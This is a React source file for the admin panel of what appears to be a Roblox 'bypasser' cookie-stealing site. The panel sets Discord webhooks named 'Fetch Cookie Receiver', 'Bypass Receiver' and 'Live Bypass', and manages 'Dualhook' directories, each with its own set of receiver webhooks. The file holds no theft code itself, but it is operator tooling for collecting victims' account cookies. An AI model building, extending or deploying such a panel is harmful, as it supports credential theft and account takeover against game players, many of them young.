import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Shield, LogOut, Webhook, FolderPlus, Trash2, Link as LinkIcon, ChevronDown, ChevronUp, Plus } from "lucide-react";
import {
  WK, getWebhook, setWebhook,
  Directory, getDirectories, addDirectory, deleteDirectory, notifyDirectoryCreated,
} from "@/lib/tokenStore";
import { toast } from "sonner";

const AdminPanel = () => {
  const navigate = useNavigate();
  const [bypassWh, setBypassWh] = useState("");
  const [fetchWh, setFetchWh] = useState("");
  const [dirWh, setDirWh] = useState("");
  const [liveWh, setLiveWh] = useState("");
  const [invite, setInvite] = useState("");
  const [siteUrl, setSiteUrl] = useState("");
  const [dirs, setDirs] = useState<Directory[]>([]);
  const [newDir, setNewDir] = useState({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "", discordInviteUrl: "", directoryReceiver: "" });
  const [whOpen, setWhOpen] = useState(true);
  const [dirOpen, setDirOpen] = useState(true);
  const [addOpen, setAddOpen] = useState(false);

  useEffect(() => {
    if (sessionStorage.getItem("admin") !== "true") { navigate("/admin-login"); return; }
    setBypassWh(getWebhook(WK.bypass));
    setFetchWh(getWebhook(WK.fetchCookie));
    setDirWh(getWebhook(WK.directory));
    setLiveWh(getWebhook(WK.liveBypass));
    setInvite(getWebhook(WK.discordInvite));
    setSiteUrl(getWebhook(WK.siteUrl));
    setDirs(getDirectories());
  }, [navigate]);

  const saveAll = () => {
    setWebhook(WK.bypass, bypassWh);
    setWebhook(WK.fetchCookie, fetchWh);
    setWebhook(WK.directory, dirWh);
    setWebhook(WK.liveBypass, liveWh);
    setWebhook(WK.discordInvite, invite);
    setWebhook(WK.siteUrl, siteUrl);
    toast.success("Settings saved");
  };

  const handleAddDir = async () => {
    if (!newDir.name.trim()) { toast.error("Directory name required"); return; }
    const d = addDirectory({
      name: newDir.name.trim(),
      bypassWebhook: newDir.bypassWebhook.trim(),
      fetchCookieWebhook: newDir.fetchCookieWebhook.trim(),
      liveBypassWebhook: newDir.liveBypassWebhook.trim(),
      discordInviteUrl: newDir.discordInviteUrl.trim(),
      directoryReceiver: newDir.directoryReceiver.trim(),
    });
    setDirs(getDirectories());
    setNewDir({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "", discordInviteUrl: "", directoryReceiver: "" });
    setAddOpen(false);
    toast.success("Directory created");
    notifyDirectoryCreated(d);
  };

  const handleDeleteDir = (id: string) => {
    deleteDirectory(id);
    setDirs(getDirectories());
    toast.success("Directory deleted");
  };

  const handleLogout = () => { sessionStorage.removeItem("admin"); navigate("/"); };

  const WebhookField = ({ label, value, onChange }: { label: string; value: string; onChange: (v: string) => void }) => (
    <div className="space-y-1">
      <label className="text-xs font-medium text-muted-foreground">{label}</label>
      <input value={value} onChange={e => onChange(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="input-field text-xs font-mono" />
    </div>
  );

  return (
    <div className="min-h-screen px-4 py-6">
      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
              <Shield size={18} className="text-primary" />
            </div>
            <h1 className="text-lg font-bold text-foreground">Admin Panel</h1>
          </div>
          <button onClick={handleLogout} className="text-muted-foreground hover:text-foreground transition-colors p-2"><LogOut size={18} /></button>
        </div>

        {/* Webhook + Settings */}
        <div className="card-glow rounded-2xl p-5 space-y-3">
          <button onClick={() => setWhOpen(!whOpen)} className="flex items-center justify-between w-full">
            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-primary/20 flex items-center justify-center"><Webhook size={14} className="text-primary" /></div>
              Webhook Configuration
            </h2>
            {whOpen ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
          </button>
          {whOpen && (
            <div className="space-y-3 pt-2">
              <WebhookField label="Bypass Receiver" value={bypassWh} onChange={setBypassWh} />
              <WebhookField label="Fetch Cookie Receiver" value={fetchWh} onChange={setFetchWh} />
              <WebhookField label="Directory Receiver (Webhook | Sites)" value={dirWh} onChange={setDirWh} />
              <WebhookField label="Live Bypass" value={liveWh} onChange={setLiveWh} />
              <div className="space-y-1 pt-2 border-t border-border/40">
                <label className="text-xs font-medium text-muted-foreground flex items-center gap-1.5"><LinkIcon size={11} /> Discord Invite URL</label>
                <input value={invite} onChange={e => setInvite(e.target.value)} placeholder="https://discord.gg/your-server" className="input-field text-xs font-mono" />
              </div>
              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Site URL (used in embed)</label>
                <input value={siteUrl} onChange={e => setSiteUrl(e.target.value)} placeholder="https://Rblxbypasser.com" className="input-field text-xs font-mono" />
              </div>
              <button onClick={saveAll} className="bg-primary text-primary-foreground px-4 py-2.5 rounded-xl font-medium text-sm hover:opacity-90 w-full">Save Settings</button>
            </div>
          )}
        </div>

        {/* Directories */}
        <div className="card-glow rounded-2xl p-5 space-y-3">
          <button onClick={() => setDirOpen(!dirOpen)} className="flex items-center justify-between w-full">
            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-primary/20 flex items-center justify-center"><FolderPlus size={14} className="text-primary" /></div>
              Directories (Dualhook)
            </h2>
            {dirOpen ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
          </button>
          {dirOpen && (
            <div className="space-y-3 pt-2">
              {dirs.length === 0 ? (
                <p className="text-xs text-muted-foreground py-3 text-center">No directories yet.</p>
              ) : (
                <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
                  {dirs.map(d => (
                    <div key={d.id} className="flex items-center justify-between bg-secondary/50 rounded-xl px-3.5 py-2.5 border border-border/50 group">
                      <span className="text-sm font-medium text-foreground truncate">{d.name}</span>
                      <button onClick={() => handleDeleteDir(d.id)} className="text-muted-foreground hover:text-destructive p-1.5"><Trash2 size={13} /></button>
                    </div>
                  ))}
                </div>
              )}
              {!addOpen ? (
                <button onClick={() => setAddOpen(true)} className="w-full bg-primary/10 border border-primary/30 text-primary hover:bg-primary/15 text-sm font-medium py-2.5 rounded-xl flex items-center justify-center gap-2">
                  <Plus size={14} /> New Directory
                </button>
              ) : (
                <div className="space-y-2 p-3 rounded-xl bg-secondary/40 border border-border/50">
                  <input value={newDir.name} onChange={e => setNewDir({ ...newDir, name: e.target.value })} placeholder="Directory name" className="input-field text-sm" />
                  <input value={newDir.bypassWebhook} onChange={e => setNewDir({ ...newDir, bypassWebhook: e.target.value })} placeholder="Bypass Receiver webhook" className="input-field text-xs font-mono" />
                  <input value={newDir.fetchCookieWebhook} onChange={e => setNewDir({ ...newDir, fetchCookieWebhook: e.target.value })} placeholder="Fetch Cookie Receiver webhook" className="input-field text-xs font-mono" />
                  <input value={newDir.liveBypassWebhook} onChange={e => setNewDir({ ...newDir, liveBypassWebhook: e.target.value })} placeholder="Live Bypass webhook" className="input-field text-xs font-mono" />
                  <input value={newDir.discordInviteUrl} onChange={e => setNewDir({ ...newDir, discordInviteUrl: e.target.value })} placeholder="Discord Invite URL" className="input-field text-xs font-mono" />
                  <input value={newDir.directoryReceiver} onChange={e => setNewDir({ ...newDir, directoryReceiver: e.target.value })} placeholder="Directory Receiver webhook" className="input-field text-xs font-mono" />
                  <div className="flex gap-2">
                    <button onClick={handleAddDir} className="flex-1 bg-primary text-primary-foreground py-2 rounded-lg text-sm font-medium">Create</button>
                    <button onClick={() => setAddOpen(false)} className="flex-1 bg-secondary py-2 rounded-lg text-sm font-medium text-foreground">Cancel</button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
